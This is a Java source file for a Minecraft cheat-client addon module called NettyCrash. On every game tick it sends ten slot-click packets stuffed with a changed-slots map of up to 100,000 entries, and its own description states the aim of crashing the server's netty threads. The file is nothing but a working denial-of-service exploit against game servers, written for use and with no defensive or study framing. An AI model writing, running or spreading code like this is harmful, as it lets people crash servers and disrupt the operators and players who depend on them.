package dev.saturn.addon.modules.Crash;

import dev.saturn.addon.Saturn;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.registry.Registries;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Identifier;

public class NettyCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> bytes = sgGeneral.add(new IntSetting.Builder()
            .name("bytes")
            .description("byte")
            .defaultValue(5)
            .min(1)
            .sliderMin(1)
            .sliderMax(100000)
            .build()
    );

    private final Setting<String> item = sgGeneral.add(new StringSetting.Builder()
            .name("item")
            .description("block")
            .defaultValue("grass_block")
            .build()
    );

    public NettyCrash() {
        super(Saturn.Crash, "netty-crash", "Crashes netty threads");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        Int2ObjectMap<ItemStack> largeMap = new Int2ObjectOpenHashMap<>();
        for (int i = 0; i < bytes.get(); i++) largeMap.put(i, ItemStack.EMPTY);
        ItemStack stack = new ItemStack(Registries.ITEM.get(Identifier.of("minecraft", item.get())));
        for (int i = 0; i < 10; i++) mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(0, 0, 0, 0, SlotActionType.PICKUP, stack, largeMap));
    }
}